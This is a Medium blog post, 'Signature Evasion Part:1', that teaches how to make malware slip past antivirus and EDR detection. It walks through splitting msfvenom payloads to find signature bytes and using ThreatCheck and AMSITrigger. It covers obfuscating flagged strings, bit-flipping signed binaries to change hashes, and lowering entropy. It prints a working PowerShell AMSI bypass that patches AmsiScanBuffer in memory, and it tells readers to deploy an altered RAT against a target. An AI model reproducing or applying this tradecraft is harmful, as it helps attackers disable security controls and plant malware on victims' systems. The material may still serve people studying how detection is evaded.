---
layout: post
title: "Signature Evasion Part:1"
date: 2025-08-26
categories: [Red Team,Malware Development,Malware Analysis,Blue Team,Cybersecurity]
image: https://cdn-images-1.medium.com/max/800/1*yfVcLcbEp4ae7H72-2y-tg.jpeg
---

An adversary may struggle to overcome specific detections when facing an advanced antivirus engine or **EDR** (Endpoint Detection and Response) solution. Even after employing some of the most common **obfuscation or evasion techniques** discussed in Obfuscation Principles, **signatures** in a malicious file may still be present.

To combat persistent signature, **adversaries** can observe each **individually** and address them as needed.

in this article, we will understand what signatures are and how to find them, then attempt to break them following an agnostic thought process. To dive deeper and combat heuristic signatures, we will also discuss more advanced code concepts and “**malware best practices”**

**Learning Objectives:**

· Understand the origins of signatures and how to observe/detect them in malicious

· Implement documented obfuscation methodology to break signatures

· Leverage non-obfuscation-based techniques to break non-function oriented signatures

This article is a successor to [**obfuscation principles**](https://medium.com/@mezo512/obfuscation-principles-16b8affb5f74), we highly recommend reading it before this article if you have not already.

This is going to be a lot of information. Please locate your nearest hammer and fire extinguisher.

**Signature identification**

Before jumping into breaking signatures, we need to understand and identify what we are looking for. Signatures are used by antivirus engines to track and identify possible suspicious and/or malicious programs, in this task, we will **observe how we can manually identify an exact byte where a signature starts.**

When identifying signatures, whether **manually or automated**, we must employ an iterative process to determine **what byte a signature starts at**. By recursively **splitting a compiled binary in half and testing it**, we can get a rough estimate of a byte-range to investigate further.

we can use the native utilities **head, dd or split** to split compiled binary. In the below command prompt, we will walkthrough using **head** to find the **first signature** present in a **msfvenom** binary.

Once split, move the binary from your development environments to a machine with the anti-virus engine you would like to test on. **if an alert appears**, **move to the lower half of the split binary and split it again.** **If an alert doesn’t appear, move to the upper half of the split binary and split it again. Continue this pattern, until you cannot determine where to go; this will typically occur around the kilobyte range.**

Once you have reached the point at which you no longer accurately spilt the binary, you can use a hex editor to view the end of the binary where the signature is present.

**Process of Signature Identification**

1. **Purpose**: The goal is to locate the exact byte range or fragment in a binary file that triggers the antivirus alert. This is done to understand the AV’s detection logic or improve malware evasion techniques.
2. **Tools Used**:

<!--THE END-->

- **head**: Reads the first N bytes of a file.
- **dd**: Copies and extracts specific byte ranges from a file.
- **split**: Divides a binary file into smaller parts.

<!--THE END-->

1. **Iterative Binary Splitting**:

<!--THE END-->

- Start with a compiled binary (e.g., generated using **msfvenom**).
- Move the binary to an environment with the target antivirus engine.
- Split the binary into two halves:
- If an AV alert is triggered with the first half, the signature lies in that range.
- If not, the signature lies in the second half.
- Repeat the splitting process with the half that triggers the alert.

This process continues until the range of bytes is narrow enough (e.g., a few kilobytes or smaller).

1. **Using a Hex Editor**: Once the suspected range is identified, open the binary in a hex editor (e.g., Hex Editor **Neo** or **HxD**) to analyze the specific bytes. This manual inspection helps identify patterns or sequences flagged by the antivirus.

**Example Walkthrough**

Suppose you have a malicious binary (**payload.exe**) generated using **msfvenom**.

1. **Split the Binary**:

<!--THE END-->

- Use **head** to take the first **50%** of the file:

> **head -c $(($(wc -c &lt; payload.exe) / 2)) payload.exe &gt; payload\_half1.exe**

- Use **dd** for finer control:

> **dd if=payload.exe of=payload\_half1.exe bs=512 count=1024**

This extracts the first **512 bytes × 1024 blocks (512 KB).**

**2. Transfer and Test**:

- Transfer **payload\_half1.exe** to the antivirus environment.
- If no alert occurs, test the second half:

> **tail -c +$(($(wc -c &lt; payload.exe) / 2)) payload.exe &gt; payload\_half2.exe**

**3. Iterate**:

- If an alert is triggered in **payload\_half1.exe**, split it further:

> **head -c $(($(wc -c &lt; payload\_half1.exe) / 2)) payload\_half1.exe &gt; payload\_quarter1.exe**

- Repeat until the trigger point is narrowed to a small byte range.

**4. Hex Analysis**:

- Open the final range in a hex editor.
- Look for patterns, such as specific sequences of bytes or recognizable instructions.

**Why Does This Work?**

Antivirus engines scan files for predefined patterns. By isolating the parts of the file that trigger alerts, you can deduce:

- The specific bytes causing the detection.
- How changes to the binary (e.g., encoding, obfuscation) affect detection.

**Example with Detection**

Let’s say the suspected signature lies in the range:

**4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF**

This might be part of a Portable Executable (**PE**) header. A modification or removal of this range can potentially evade detection but might also break the file’s functionality. Further analysis might suggest:

- Padding the bytes.
- Encrypting payloads.
- Dynamically decrypting signatures during runtime.

**Automating Signature identification**

The process shown in the previous task can be quite arduous. To speed it up, automate it using scripts to spilt bytes over an interval for us. **Find-AVSignature** will split a provided range of bytes through given interval.

This script relieves a lot of the manual work, but still has several limitations. Although it requires less interaction than the previous task, it still requires an appropriate interval to be set to function property. This script will also only observe strings of the binary when dropped to disk rather than scanning using the Full functionality of the antivirus engine.

To solve this problem, we can use other **FOSS (Free and Open Source Software) tools** that leverage the engines themselves to scan the file, including **Defender Check, Threat Check, and AMSITrigger**. In this task, we will primarily focus on **Threat Check** and briefly mention the uses of **AMSITrigger** at the end.

**ThreatCheck**

Threat Check is a **fork of Defender Check and is arguably the most widely used/reliable of the three**. To identify possible signatures, Threat Check **leverages several anti-virus engines against split compiled binaries and reports where it believes bad bytes are present**.

[https://github.com/rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)

For our uses we only we need to supply a file and optionally an **engine**; however, we will primarily want to use **AMSITrigger** when dealing with **AMSI ( Anti-Malware-Scan-Interface)** ,as we will discuss later in this task.

> **ThreatCheck.exe –help**

> **ThreatCheck.exe –f Downloads\\Grunt.bin –e Defender or AMSI**

It’s that simple! No other configuration or syntax is required and we can get straight to modify our tooling. To efficiently use this tool, we can identify any bad bytes that are first discovered then recursively break them and run the tool again until no signatures are identified

**Note**: There may be instances of false positives, in which the tool will report no bad bytes. This will require your own intuition to observe and solve.

**AMSITrigger**

**AMSI leverages the runtime, making signatures harder to identify and resolve**. **Threat Check also does not support certain File types such as PowerShell that AMSITrigger does.**

**AMSITrigger** will leverage the AMSI engine and scan Functions against a provided PowerShell script and report any specific sections of code it believes need to be alerted on.

[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)

> **Amsitrigger.exe –help**

> **Show Help**

For our uses we only need to **supply a file and the preferred format** to report signatures.

**Static Code-Based Signatures**

Once we have identified a troublesome signature we need to decide how we want to deal with it. Depending on the strength and type of signature, it may be broken using simple obfuscation as covered in [**Obfuscation Principles**](https://medium.com/@mezo512/obfuscation-principles-16b8affb5f74), or it may require specific investigation and remedy. In this task, we aim to provide several solutions to remedy static signatures present in functions.

The **Layered Obfuscation Taxonomy** covers the most reliable solutions as part of the **Obfuscating Methods and Obfuscating Classes layer**.

**Obfuscating methods**

**Method Proxy**: Creates a **proxy** method or a replacement object.

**Method Scattering/Aggregation**: **Combine** multiple methods into one or scatter a method into several.

**Method Clone**: Create **replicas** of a method and randomly call each.

**Obfuscating Classes**

**Class Hierarchy Flattening**: Create **proxies** for classes using interfaces.

**Class Splitting/Coalescing:** **Transfer** local variables or instruction groups to **another class**.

**Dropping Modifiers**: **Remove** class modifiers (public, private) and make all members **public**

Looking at the above tables, even though they may use specific terms or ideas, we can group them into a core set of agnostic methods applicable to any object or data structure.

The techniques **class splitting/coalescing and method scattering/aggregation can** be grouped into an overarching concept of splitting or merging any given **OOP** (**Object-Oriented Programming) function**

Other techniques such as **dropping modifiers or method clone** can be grouped into an overarching concept of **removing or obscuring identifiable Information**

**Splitting and Merging Objects**

The methodology required to split or merge objects in very similar to the objective of concatenation as covered in [**Obfuscation Principles**.](https://medium.com/@mezo512/obfuscation-principles-16b8affb5f74)

The premise behind this concept is relatively easy, we are looking to create object function that can break the signature while maintaining the previous functionality.

To provide a more concrete example of this, we can use the **well-known** case study in **Covenant present** in the ***GetMessageFormat*** string. we will first look at **how the solution was implemented** then break it down and apply it to the **obfuscation taxonomy.**

**Original String**

Below is the original string that is detected

![](https://cdn-images-1.medium.com/max/800/1*98Lj-fl0b7j81P5x_HbxNQ.png)

**Obfuscated Method**

Below is the new class used to replace and concatenate the string,

![](https://cdn-images-1.medium.com/max/800/1*aPlFoSjZ5DwZcd7Bs5SGbQ.png)

**Removing and Obscuring Identifiable Information**

The core concept behind removing identifiable information is **similar** **to obscuring variable names as covered in Obfuscation.** In this task, we are taking it one step further by specifically applying it to **identified signatures in any objects including methods and classes.**

An example of this can be found in **Mimikatz** where an alert is generated for the string **wigest. dll.** This can be solved by **replacing** the string with **any random identifier** changed throughout all instances of the string. This can be categorized in the **obfuscation taxonomy** under the **method proxy technique**.

This is almost no different than as discussed in Obfuscation Principles; however, it is applied to a specific situation.

Using the knowledge, you have accrued throughout this task, obfuscate the following PowerShell snippet, using **AmsiTrigger** to visual signatures.

![](https://cdn-images-1.medium.com/max/800/1*G0-_gm36E2GtnTjy2SB-jA.png)

**Obfuscated Code :**

> **$MethodDefinition = @’**

> **[DllImport(“kernel32”, CharSet=CharSet.Ansi, ExactSpelling=true,**

> **SetLastError=true)]**

> **public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);**

> **\[DllImport(“kernel32.dll”, CharSet=CharSet.Auto)]**

> **public static extern IntPtr GetModuleHandle(string lpModuleName);**

> **\[DllImport(“kernel32”)]**

> **public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint**

> **flNewProtect, out uint lpflOldProtect);**

> **‘@**

> **$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name ‘Kernel32’ -**

> **Namespace ‘Win32’ -PassThru**

> **$ASBD = “AmsiS”+”canBuffer”**

> **$handle = \[Win32.Kernel32]::GetModuleHandle(“amsi.dll”)**

> **\[IntPtr]$BufferAddress = \[Win32.Kernel32]::GetProcAddress($handle, $ASBD)**

> **\[UInt32]$Size = 0x5**

> **\[UInt32]$ProtectFlag = 0x40**

> **\[UInt32]$OldProtectFlag = 0**

> **\[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag,**

> **\[Ref]$OldProtectFlag)**

> **$buf = new-object byte\[] 6**

> **$buf\[0] = \[UInt32]0xB8**

> **$buf\[1] = \[UInt32]0x57**

> **$buf\[2] = \[UInt32]0x00**

> **$buf\[3] = \[Uint32]0x07**

> **$buf\[4] = \[Uint32]0x80**

> **$buf\[5] = \[Uint32]0xC3**

> **\[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6)**

**Static Property-Based Signature**

various detection analysts may consider different indicators rather than strings or static signatures in contribute to their hypothesis. Signatures can be attached to several file properties, including file hash, entropy, author, name, or other identifiable information to be used individually or in conjunction. These properties are often used in rule sets such **as YARA or Sigma.**

Some properties may be easily manipulated, while others can be more difficult, specifically when dealing with pre-compiled closed-source applications.

This task will discuss manipulating the **file hash and entropy** of both open-source and closed-source applications.

**Note**: several other properties such as PE headers or module properties can be used as indicators. Because these properties often require an agent or other measures to detect, we will not cover them in this room to keep the focus on signatures.

**File Hashes**

A **file hash** known as **a checksum**, is used to tag/identify a unique file. They are commonly used to verify authenticity or its known purpose (malicious or not). File hashes are generally arbitrary to modify and are changed due to any modification to the file.

If we have access to the source of an application, we can modify arty arbitrary section of the code and re-compile it to create a new hash. That solution is a straightforward, but what if we need a pre-compiled or signed application?

When dealing with a signed or closed-source application, we must employ **bit-flipping.**

**Bit-flipping** is a common cryptographic attack that will mutate a given application by flipping and testing each possible bit until it finds a viable bit. By flipping one viable bit, it will change the signature and hash of the application while maintaining all functionality.

We can use a script to create a **bit-flipped list** by flipping each bit and creating a **new mutated variant** (3000–200000 variants). Below is an example of a python bit-flipping implementation.

![](https://cdn-images-1.medium.com/max/800/1*dgITV7nuE2aXj4xiErIvfQ.png)

Once the list is created, we must search for intact unique properties of the file. For example, if we are bit-flipping **msbuild**, we need to use **signtool** to search for a file with a useable certificate. This will guarantee that the functionality of the file is not broken, and the

Application will maintain its signed attribution.

This technique can be very **lucrative**, although it can take a **long time** and will only have a **limited** period until the hash is discovered.

### Steps for Performing Bit-Flipping in Signature Evasion

#### 1. Identify a Target Executable

The first step is to choose a target binary that is either already known or has a known signature. This binary could be an existing malicious executable, such as a piece of malware, or a clean executable that you want to manipulate.

- **Example**: You might have a known malicious payload, such as a **RAT** (Remote Access Trojan) or backdoor, with a signature that you want to evade.

#### 2. Calculate the Original Hash/Signature

To begin, you need to understand the hash signature of the original binary. This will help you know exactly how the file looks when analyzed by signature-based tools.

· Use a tool like `shasum`, `sha256sum`, or `CertUtil` to calculate the hash.

**Command Example**:

```
sha256sum malicious_binary.exe
```

· **Note**: This hash will be used to detect the file via antivirus or other signature-based tools.

#### 3. Modify the Binary with Bit-Flipping

The core of the bit-flipping process is to modify specific bits in the binary. You can flip bits in unused sections (e.g., **padding** or **debug** data) or **non-essential areas** (like **filler code**) to change the file’s hash.

· **Bit-Flipping Tools**: You can use hex editors or specialized tools to perform the bit-flipping.

**Hex Editors**: Tools like `HxD`, `010 Editor`, or `Hex Fiend` allow you to manually inspect and flip bits at specific locations within the binary file.

**Automated Bit-Flipping**: Tools like `radare2` or `binwalk` can be used for more sophisticated analysis and manipulation of the binary.

· **Flipping Bits**: In a hex editor, each byte in the file is represented by two hexadecimal digits. To flip a bit:

- Convert the byte to binary.
- Flip a bit (change 0 to 1 or vice versa).
- Convert the byte back to hexadecimal.

**Example**:

- Original byte: `0x90` (which is `10010000` in binary).
- Flip the third bit: `0x98` (which is `10011000` in binary).

#### 4. Verify the New Hash

After performing the bit-flipping, recalculate the hash of the modified binary to see if it differs from the original hash.

· **Command Example**:

```
sha256sum modified_binary.exe
```

· The hash should now be different from the original one, meaning signature-based detection tools will likely fail to recognize the altered file.

#### 5. Test the Binary for Functionality

Ensure that the modified binary still works as intended. While the file’s hash has changed, it’s critical to verify that the original functionality has not been altered by the bit-flipping.

- **Static Analysis**: Perform static analysis with disassemblers like **IDA Pro**, **Ghidra**, or **Binary Ninja** to ensure the execution flow remains intact.
- **Dynamic Analysis**: Run the modified binary in a controlled environment (e.g., a sandbox or VM) to confirm that it behaves as expected.

#### 6. Deploy and Evade Signature Detection

Once the binary has been altered and tested, deploy it in the environment you wish to target. Signature-based detection tools that rely on known hashes or patterns will be less likely to detect the modified version, increasing the chances of successful evasion.

- **Antivirus Evasion**: Tools like **VirusTotal** can be used to test whether your binary is now undetectable. Since the hash has changed, traditional antivirus software might fail to recognize the file

### Challenges in Bit-Flipping Attacks

1. **No Guarantees of Evasion**: Some modern antivirus engines, especially those using machine learning or heuristic analysis, might still flag the modified binary based on behavior analysis.
2. **Advanced Detection Mechanisms**: Many security systems use additional detection layers like behavioral analysis, entropy measurement, and heuristic checks that bit-flipping alone might not bypass.
3. **Limited Space for Bit-Flipping**: Bit-flipping in certain areas may lead to corruption of essential code, rendering the binary non-functional.

**Entropy**

From **IBM**, Entropy in defined as **“the randomness of the data in a file used to determine whether a file contains hidden data or suspicious scripts**”. **EDRs and other scanners** often leverage **entropy** to identify potential suspicious files or contribute to on overall **malicious score**.

Entropy can be **problematic** for **obfuscated scripts**, specifically when obfuscating identifiable information such as variables or functions.

To **lower entropy**, we can **replace** **random** identifiers with **randomly selected English words**. For example, may change a variable from **q234uf** to **nature**.

To prove the efficacy of changing identifiers. observe how the entropy changes using **cyberchef**.

Below is the Shannon entropy scale for a standard English paragraph.

**Shannon entropy: 4.587362034903882**

Below is the Shannon entropy scale for a small script with **random identifiers.**

**Shannon entropy, 5.341436973971389**

Depending on the EDR employed, “**suspicious**” entropy value is **greater than 6.8.**

The difference between a random value and English text will become amplified with a larger file and more occurrences.

Note that entropy will generally never be used alone and only to support a hypothesis. For example, the **entropy** for the command **pskill** and the **hivenightmare** **exploit** **almost identical.**

in the white paper**, An Empirical Assessment of Endpoint Detection and Response Systems against Advanced Persistent Threats Attack Vectors,** **SentinelOne** is shown to detect a DLL due to high entropy, specifically through AES encryption.

**Stay tuned for Part2.**

By [Moataz Osama](https://medium.com/@mezo512) on [January 24, 2025](https://medium.com/p/2858e18b7321).

[Canonical link](https://medium.com/@mezo512/signature-evasion-techniques-part-1-2858e18b7321)

Exported from [Medium](https://medium.com) on August 26, 2025.